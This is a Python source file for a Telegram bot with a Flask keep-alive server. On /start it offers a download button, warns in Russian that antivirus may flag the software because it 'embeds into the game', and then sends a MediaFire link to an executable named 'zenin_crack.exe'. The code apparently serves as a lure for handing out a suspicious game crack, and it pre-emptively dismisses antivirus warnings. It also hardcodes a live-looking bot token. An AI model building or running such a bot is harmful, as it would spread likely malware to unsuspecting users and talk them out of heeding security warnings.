import os
import threading
from flask import Flask
import telebot
from telebot import types

TOKEN = "8328766400:AAFlDEAcrnUwYgGdVLYMv_MTpg9yBinZ6fg"  # Замени на свой токен!
SOFT_LINK = "https://www.mediafire.com/file/aulm7t7mu6388sc/zenin_crack.exe/file"

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

@bot.message_handler(commands=['start'])
def start(message):
    keyboard = types.InlineKeyboardMarkup()
    button = types.InlineKeyboardButton("📥 Скачать софт", callback_data="download")
    keyboard.add(button)
    bot.send_message(message.chat.id, "⚠️ Антивирус может ругаться на софт, потому что он вьедается в игру", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    if call.data == "download":
        bot.send_message(call.message.chat.id, f"🔗 Ссылка для скачивания:\n{SOFT_LINK}")

@app.route('/')
def index():
    return "Bot is running!"

@app.route('/health')
def health():
    return "OK"

# Запускаем бота в отдельном потоке
def run_bot():
    bot.infinity_polling()

if __name__ == "__main__":
    bot_thread = threading.Thread(target=run_bot)
    bot_thread.start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)